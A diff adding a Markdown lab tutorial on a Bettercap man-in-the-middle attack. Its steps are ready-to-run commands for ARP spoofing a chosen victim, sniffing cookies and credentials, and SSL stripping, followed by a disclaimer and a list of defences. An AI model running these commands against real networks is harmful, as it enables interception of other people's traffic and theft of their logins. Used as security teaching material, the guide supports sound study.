@@ -1,0 +1,188 @@
+# 🧪 Hands-On Lab: Man-in-the-Middle (MITM) Attack Using Bettercap
+
+*A practical lab for learning ARP spoofing and traffic interception on a local network.*
+
+---
+
+## 📌 Overview
+
+This lab walks you through performing a **Man-in-the-Middle (MITM)** attack using **Bettercap** on a local network. It is for **learning and testing on your own devices only**.
+
+You will learn:
+
+* Scanning your local network
+* Identifying a target device
+* Performing ARP spoofing
+* Intercepting HTTP/HTTPS traffic
+* Capturing credentials and requests
+
+---
+
+## ⚠️ Legal Disclaimer
+
+This lab is **only for educational purposes** and must be performed **on your own network and your own devices**. Never attack a network you do not own or control.
+
+---
+
+## 🧰 Requirements
+
+* Kali Linux or any Linux distro with Bettercap
+* A Wi-Fi network you own
+* One victim device (phone or laptop) connected to the same network
+* Root/administrator privileges
+
+---
+
+## 📥 Step 1 — Install Bettercap
+
+On Kali Linux, Bettercap is already installed. If not, install it:
+
+```bash
+sudo apt update
+sudo apt install bettercap
+```
+
+Check version:
+
+```bash
+bettercap -version
+```
+
+---
+
+## 🌐 Step 2 — Identify Your Network Interface
+
+List your interfaces:
+
+```bash
+ip a
+```
+
+Start Bettercap with your network interface:
+
+```bash
+sudo bettercap -iface wlan0
+```
+
+---
+
+## 🔍 Step 3 — Scan the Network
+
+In the Bettercap shell:
+
+```text
+net.probe on
+net.recon on
+```
+
+List discovered hosts:
+
+```text
+net.show
+```
+
+Example:
+
+```
+192.168.1.1    Router
+192.168.1.15   Victim (Android)
+192.168.1.21   Laptop
+```
+
+---
+
+## 🎯 Step 4 — Set the Target
+
+```text
+set arp.spoof.targets 192.168.1.15
+```
+
+(Replace with your victim's IP.)
+
+---
+
+## 🧪 Step 5 — Start ARP Spoofing
+
+```text
+arp.spoof on
+```
+
+You are now positioned between the victim and the router.
+
+---
+
+## 📡 Step 6 — Sniff Traffic
+
+```text
+net.sniff on
+```
+
+Captured data may include:
+
+* HTTP requests
+* Cookies
+* Parameters
+* Login credentials
+
+---
+
+## 🔐 Step 7 — Intercept HTTPS (Optional)
+
+```text
+https.proxy on
+```
+
+Bettercap will attempt SSL stripping where possible.
+
+---
+
+## 📁 Step 8 — Save Captured Traffic
+
+```text
+set net.sniff.output /home/user/mitm-capture.pcap
+net.sniff on
+```
+
+View the file later in **Wireshark**.
+
+---
+
+## 🛑 Step 9 — Stop the Attack
+
+```text
+arp.spoof off
+net.sniff off
+https.proxy off
+quit
+```
+
+---
+
+## 🧠 What You Learned
+
+* Bettercap network reconnaissance
+* ARP spoofing mechanics
+* Intercepting and analyzing victim traffic
+
+---
+
+## 🛡 Defending Against MITM Attacks
+
+* Use **WPA3/WPA2**
+* Disable **WPS**
+* Use **VPN**
+* Update router firmware
+* Enable **client isolation**
+* Use **Dynamic ARP Inspection (DAI)** when possible
+* Use **HTTPS** everywhere
+
+---
+
+## 📘 Conclusion
+
+This lab demonstrates how powerful MITM attacks can be when a network is not secure. Understanding MITM is essential for:
+
+* SOC Analysts
+* Pentesters
+* Red Teamers
+* Network Security Engineers
